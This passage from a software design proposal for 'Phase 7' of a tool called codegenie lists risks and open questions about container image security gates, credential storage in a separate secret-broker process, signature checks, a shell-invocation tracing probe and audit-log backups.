- **Local-dev experience for Chainguard auth.** The Secret Broker daemon requires an operator-time `codegenie chainguard init` ceremony to encrypt the refresh credential. On macOS, this lands in the OS keychain; on Linux, in an `age`-encrypted file. Operators on bare laptops without a desktop keychain pay the `age` cost. Synth should weigh whether Phase 7 ships the `age` path or only the keychain path.
- **`dive`-derived `static_shell_binary_count` interpretation.** "Shell binary" is heuristic — `dive` reports `/bin/sh`, `/usr/bin/bash`, `/bin/dash`, `/bin/busybox`, but a custom-named shell escapes the heuristic. The synth should consider whether the gate also runs an ELF-symbol scan for `execve` patterns. I argue no for Phase 7 (heuristic is sufficient given that the Chainguard distroless images by construction don't ship arbitrary binaries); the synth may push harder.
- **No replication of the audit chain.** Phase 7 doesn't add audit replication; that's [Phase 16 hardening](../../roadmap.md). A disk failure on the orchestrator host loses the chain. Mitigation: the chain is on the same disk as the working tree, which is also at risk; operators should back up `.codegenie/audit/` with the same cadence as the working tree. The synth should consider whether Phase 7 ships a one-line `rsync` recipe in the docs.

---

## Open questions for the synthesizer

1. **`ShellInvocationTraceProbe` lifecycle classification.** I classify it as `applies_to_lifecycle=["gate"]` and require gate-control (not the Phase-2 coordinator) to dispatch it. This is an additive field on the `Probe` ABC that defaults to `["gather"]` for backward compatibility. Best-practices may push for a separate probe ABC (`GateProbe`) rather than a polymorphic field. The synth should weigh which preserves "extension by addition" more cleanly: an additive field (mine) or a sibling ABC.

2. **Secret Broker vs in-orchestrator Chainguard handling.** I split the broker out to a separate process and a separate Unix user. Best-practices may argue for in-orchestrator handling with `keyring`-only access and no separate daemon. The split adds operational complexity; the gain is that an orchestrator memory dump never carries the Chainguard refresh credential. I argue for the split; the synth must weigh ops complexity.

3. **`age`-encrypted credential file vs OS keychain.** I propose both: macOS uses keychain; Linux uses `age`-encrypted file under `/etc/codegenie/secrets/`. Best-practices may argue for HashiCorp Vault or AWS Secrets Manager from the start (skipping the local-only credential storage entirely). For a local POC, I argue the lightweight option; for Phase 16 production, Vault.

4. **Cosign rekor (transparency log) lookup as a strict-AND signal.** I left this out of the strict-AND in goal 10 but flagged it in Risks #4. The synth should decide whether Phase 7 lands a `image.signature.rekor_verified == true` signal as part of the strict-AND or whether that's Phase 8+.

5. **Per-image `allowed-shell-invocations.yaml` opt-out for the `ShellInvocationTraceProbe`.** I argue against it for Phase 7 (weakens the gate); operators with legitimate shell-using entrypoints escalate to human review. Best-practices may argue an explicit allowlist with strong audit is better than blanket human escalation.

6. **CVE-to-image-map ingest cadence in Phase 7.** I propose manual `codegenie cve-image-map fetch` ceremony, automation deferred to [Phase 16](../../roadmap.md). The roadmap's "extension by addition" intent is silent on whether the ingest pipeline is itself an extension or part of the Phase-3 continuous-gather Phase-14 work. Synth should locate this.

7. **Frozen-file CI gate scope.** I propose freezing every file under `src/codegenie/{loop,sandbox,gate,fallback,probes/{A..G},audit,state}/`. Best-practices may push for freezing the *contract surfaces* only (the Pydantic models + ABC definitions), not the implementations. The contract-surface-only freeze is more permissive (allows refactoring within a file as long as the public surface doesn't change); the file-level freeze is stricter and matches the literal ADR-0028 commitment ("the diff for this phase touches only new files"). I argue file-level; the synth may want contract-surface freezes for ergonomics.

8. **Whether Phase 7 ships an automated "rejected-Dockerfile-becomes-test-fixture" loop.** I argue this lands in [Phase 11](../../roadmap.md)'s Stage 7 Learning loop; the synth may want a minimal manual CLI version in Phase 7 (`codegenie corpus add-rejected <wf>`) to start building the corpus from day one. I lightly support shipping the CLI in Phase 7; the synth decides.
